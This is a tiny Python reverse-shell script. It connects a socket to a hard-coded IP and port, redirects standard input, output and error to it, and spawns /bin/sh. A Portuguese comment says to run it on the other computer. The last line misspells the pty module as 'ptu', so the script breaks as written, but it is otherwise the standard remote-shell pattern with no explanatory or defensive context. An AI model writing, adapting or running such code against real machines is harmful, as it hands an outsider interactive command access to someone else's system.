import socket,os,pty

ip = "127.0.0.1"
port = 12374

s = socket.socket()
s.connect((ip,port))
for fd in (0,1,2):
	os.dup2(s.fileno(), fd)
	
ptu.spawn('/bin/sh')
#executa isso no outro computador
